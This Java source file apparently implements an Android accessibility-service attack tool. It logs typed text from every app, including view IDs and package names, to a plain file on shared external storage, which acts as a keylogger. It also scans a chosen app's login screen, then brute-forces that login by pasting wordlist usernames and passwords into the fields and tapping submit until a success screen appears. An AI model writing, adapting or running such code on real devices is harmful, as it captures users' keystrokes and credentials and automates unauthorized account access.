package com.example.acService;

/**
 * Created by res on 7/9/14.
 */
import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.content.Intent;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.Environment;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.widget.Toast;

import java.io.*;
import java.util.ArrayList;

public class RecorderService extends AccessibilityService {

    static final String TAG = "RecorderService";

    /* Variables holding the target application details */
    private String packageName;
    private String activityName;
    private String successActivityName;
    private String failureActivityName;
    private ArrayList<String> fields;
    private String lastActivity;
    int runMode;

    /* Bruteforce booleans */
    private boolean bruteforceRunning = true;

    /* Sample user/pass data */
    private String[][] wordlist = {
            {"admin", "rahul", "res"},
            {"beep", "tick", "billo", "boom"}
    };

    private String logA, logB;

    /* Counters */
    private int userCount = 0, passCount = -1;

    TinyDB prefsDb;


    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        Log.v(TAG, "onServiceConnected");
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.flags = AccessibilityServiceInfo.DEFAULT | AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS;
        info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;

        setServiceInfo(info);

        /* TODO: Get the required info using some other method than share preferences */
        prefsDb = new TinyDB(this);

        lastActivity = "";
        logA = "";
        logB = "";
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {


//        Log.d("ACSERVICE", event.getClassName().toString());

        if(event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED){
            logIt(event);
        }

        runMode = getMode();
        if(runMode > 0)
            readTargetData();

        /* Get the source of the event */
        AccessibilityNodeInfo source = event.getSource();

        if(source != null && event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
                && event.getPackageName().equals(packageName)){
            switch (runMode){
                case 1: if(event.getClassName().toString().equals(activityName)){
                            doRecon(source);
                            performGlobalAction(GLOBAL_ACTION_BACK);
                        }
                        break;

                case 2:
                        if(event.getClassName().toString().equals(activityName) || event.getClassName().toString().equals(failureActivityName)) {
                            runBruteForceIteration(event);
                        }
                        break;

            }
        }
    }

    @Override
    public void onInterrupt() {
        Log.v(TAG, "onInterrupt");
    }


    /**
     * Runs a single iteration of the brute-force loop. This method is called
     * when accessibility event is triggered and run mode is 2.
     * It sets run mode to 0 if we are successful.
     *
     * @param event The acccessibility event that occured
     *
     * */
    void runBruteForceIteration(AccessibilityEvent event){
        /* Continue only if bruteforce is running */
        if(bruteforceRunning){

            /* Else, if it is the login activity, try logging in  */
            if(event.getClassName().equals(activityName)  && lastActivity.equals("")){
                if(activityName.equals(failureActivityName))
                    lastActivity = activityName;
                tryLogin(event.getSource());
            }
            /* If we have obtained the success activity defined, stop! */
            else if(event.getClassName().equals(successActivityName)){
                Toast.makeText(this, "Brute-force completed successfully.", Toast.LENGTH_LONG).show();
                bruteforceRunning = false;
                setMode(0);
            }
                /* Else, if it is the failure activity, go back to our login activity */
            else if(event.getClassName().equals(failureActivityName)){
                lastActivity="";
                if(!activityName.equals(failureActivityName))
                    performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK);
                else
                    tryLogin(event.getSource());

            }

        }

    }

    /**
     *
     * Returns the path of the image specified in the intent provided
     *
     * @param  node      An accessibility node which contains all the elements we need
     * @return           nothing
     *
     */

    void tryLogin(AccessibilityNodeInfo node){

        /* if we have passwords remaining to test with a username, try it */
        if(passCount < wordlist[1].length-1){
            passCount++;
        }
        /* Else, if we reached the end of passwords, but there are usernames, go to next username and retry passwords from beginning*/
        else if(passCount == wordlist[1].length-1 && userCount < wordlist[0].length-1){
            userCount++;
            passCount = 0;
        }
        /* Else, if we have exhausted all usernames and passwords, stop bruteforce */
        else if(passCount == wordlist[1].length-1 && userCount == wordlist[0].length-1){
            bruteforceRunning = false;
            setMode(0);
            lastActivity = "";
        }


        /* Let's begin. */
        ArrayList<AccessibilityNodeInfo> nodes = new ArrayList<AccessibilityNodeInfo>();

        for(int i=0; i< fields.size(); i++){
            if(node.findAccessibilityNodeInfosByViewId(fields.get(i)).get(0) != null){
                nodes.add(node.findAccessibilityNodeInfosByViewId(fields.get(i)).get(0));
            }
        }

        if(nodes.size()>1){

            ClipboardManager clipboard = (ClipboardManager) this.getSystemService(Context.CLIPBOARD_SERVICE);
            ClipData clip = null;
            for(int i=0 ; i< nodes.size()-1; i++){

                /* Arguments to select the existing text, so that we can overwrite it */
                Bundle arguments = new Bundle();
                arguments.putInt(AccessibilityNodeInfo.ACTION_ARGUMENT_MOVEMENT_GRANULARITY_INT,
                        AccessibilityNodeInfo.MOVEMENT_GRANULARITY_WORD);
                arguments.putBoolean(AccessibilityNodeInfo.ACTION_ARGUMENT_EXTEND_SELECTION_BOOLEAN,
                        true);

                if(! nodes.get(i).isFocused())
                    nodes.get(i).performAction(AccessibilityNodeInfo.ACTION_FOCUS);

                nodes.get(i).performAction(AccessibilityNodeInfo.ACTION_PREVIOUS_AT_MOVEMENT_GRANULARITY,
                        arguments);
                if( i == 0)
                    clip = ClipData.newPlainText("label", wordlist[0][userCount]);
                else if(i==1)
                    clip = ClipData.newPlainText("label", wordlist[1][passCount]);

                clipboard.setPrimaryClip(clip);
                nodes.get(i).performAction(AccessibilityNodeInfo.ACTION_PASTE);

            }
            Log.d("ACSERVICE", "Logging in with " + wordlist[0][userCount] + " - " + wordlist[1][passCount]);
            nodes.get(nodes.size()-1).performAction(AccessibilityNodeInfo.ACTION_CLICK);

        }else{
            Toast.makeText(this, "Sorry, we can't find the required fields", Toast.LENGTH_LONG).show();
        }

    }


    /**
     * Runs reconnaissance on the login screen and writes the fields found in to a file
     *
     * @param node The node representing the login screen
     *
     * */
    void doRecon(AccessibilityNodeInfo node){
        Log.d("ACSERVICE", "DOING RECON" );
        setMode(0);
        ArrayList<FieldData> fields = new ArrayList<FieldData>();
        getChildren(node, fields);
        FileOutputStream fos = null;
        try {
            fos = openFileOutput("FIELD_DATA", MODE_PRIVATE);
            ObjectOutputStream oos = new ObjectOutputStream(fos);
            oos.writeObject(fields);
            oos.close();
            Log.d("ACSERVICE", "WROTE FILE");
            Toast.makeText(this,
                    "Recon finished. Please go back to our app and select fields",
                    Toast.LENGTH_LONG).show();

        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }

    }


    void logIt(AccessibilityEvent event){

        String type = getEventType(event);
        String id = "";
        if(event.getSource()!= null){
            if(event.getSource().getViewIdResourceName()!=null)
                id = event.getSource().getViewIdResourceName();
        }
        String text = getEventText(event);
        String cls = event.getClassName().toString();
        String app = event.getPackageName().toString();
        String action = getEventActionText(event);

        String line = "In : "+ app + " \nSource: "+ id + " ("+cls+")\nType: " + type + "\nText: "+ text + "\nAction: " + action + "\n";

        if(logA.length() >= 200 || logA.length()  + line.length() > 200){
            logB = logA;
            LogFileWriter logTask = new LogFileWriter();
            logTask.execute(logB);
            logA = "";
        }else{
            logA = logA + line;
        }

    }


    /**
     * Reads the preferences
     *
     * */
    void readTargetData(){

        packageName = prefsDb.getString("appName");
        activityName = prefsDb.getString("loginActivity");
        successActivityName = prefsDb.getString("successActivity");
        failureActivityName = prefsDb.getString("failureActivity");
        fields = prefsDb.getList("fields");

    }

    /**
    * Returns the running mode - {0:ignore, 1:recon, 2:bruteforce}
    * @return the running mode
    * */
    int getMode(){
        return prefsDb.getInt("runMode");
    }


    /**
     * Sets the running mode
     * @param mode integer value for the running mode
     *
     * */
    void setMode(int mode){
        prefsDb.putInt("runMode", mode);
    }


    /**
     * Returns true/false after checking if all required fields are not empty
     *
     * @return true if valid, false if not
     * */
    boolean isDataValid(){

        if(packageName.equals("") || activityName.equals("") || successActivityName.equals("")
                || failureActivityName.equals(""))
            return false;

        return true;

    }



    void getChildren(AccessibilityNodeInfo node, ArrayList<FieldData> fields){

        if( node.getChildCount() > 0){
            AccessibilityNodeInfo node2;
        /* Go through all children of our main node and find the user and password inputs and the submit button */
            for(int i =0; i< node.getChildCount(); i++){
                node2 = node.getChild(i);
                getChildren(node2, fields);
            }
        }else{

            if(node.getViewIdResourceName() != null){
                Log.d("reCON DATA", node.getViewIdResourceName());
                fields.add(new FieldData(node.getClassName().toString(), node.getViewIdResourceName()));
            }
        }

    }

    AccessibilityNodeInfo getChildById(AccessibilityNodeInfo node, String id){

        if(node != null && node.getViewIdResourceName() != null){
            Log.d("reCON DATA", id + " " + node.getViewIdResourceName());
            if(node.getViewIdResourceName().equals(id)) {
                Log.d("RECON DATA", "FOUND");
                return node;
            }
        }
        else if(node != null && node.getChildCount() > 0){
        /* Go through all children of our main node and find the user and password inputs and the submit button */
            for(int i =0; i< node.getChildCount(); i++){
                getChildById(node.getChild(i), id);
            }
        }
        Log.d("RECON DATA", "REACHING NULL");
        return null;
    }


    void writeToFile(String data){

        try {
            File myFile = new File(Environment.getExternalStorageDirectory()+"/aclog.txt");
            if(!myFile.exists())
                myFile.createNewFile();

            FileOutputStream os = new FileOutputStream(Environment.getExternalStorageDirectory()+"/aclog.txt", true);
            os.write(data.getBytes());
            os.close();
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }


    }


    /**
     *
     * Returns the string representation of the event type
     *
     * @param  event     the event which has occured
     * @return           string representation of the event type
     *
     */
    private String getEventType(AccessibilityEvent event) {
        switch (event.getEventType()) {
            case AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED:
                return "TYPE_NOTIFICATION_STATE_CHANGED";
            case AccessibilityEvent.TYPE_VIEW_CLICKED:
                return "TYPE_VIEW_CLICKED";
            case AccessibilityEvent.TYPE_VIEW_FOCUSED:
                return "TYPE_VIEW_FOCUSED";
            case AccessibilityEvent.TYPE_VIEW_LONG_CLICKED:
                return "TYPE_VIEW_LONG_CLICKED";
            case AccessibilityEvent.TYPE_VIEW_SELECTED:
                return "TYPE_VIEW_SELECTED";
            case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED:
                return "TYPE_WINDOW_STATE_CHANGED";
            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                return "TYPE_VIEW_TEXT_CHANGED";
        }
        return "default";
    }

    /**
     *
     * Returns the string representation of event's text
     *
     * @param  event     the event which has occured
     * @return           string representation of the event's text
     *
     */
    private String getEventText(AccessibilityEvent event) {
        StringBuilder sb = new StringBuilder();
        for (CharSequence s : event.getText()) {
            sb.append(s);
        }
        return sb.toString();
    }

    /**
     *
     * Returns the string representation of event's text
     *
     * @param  event     the event which has occured
     * @return           string representation of the event's text
     *
     */
    private String getEventActionText(AccessibilityEvent event) {
        String action = "";

        switch (event.getAction()){

            case AccessibilityNodeInfo.ACTION_CLICK: action = "CLICK"; break;
            case AccessibilityNodeInfo.ACTION_COPY: action = "COPY"; break;
            case AccessibilityNodeInfo.ACTION_PASTE: action = "PASTE"; break;
            default: break;

        }
        return action;
    }



    private class LogFileWriter extends AsyncTask<String, Void, Integer>{

        @Override
        protected Integer doInBackground(String... strings) {
            String data = strings[0];
            writeToFile(data);
            return 0;
        }
    }
}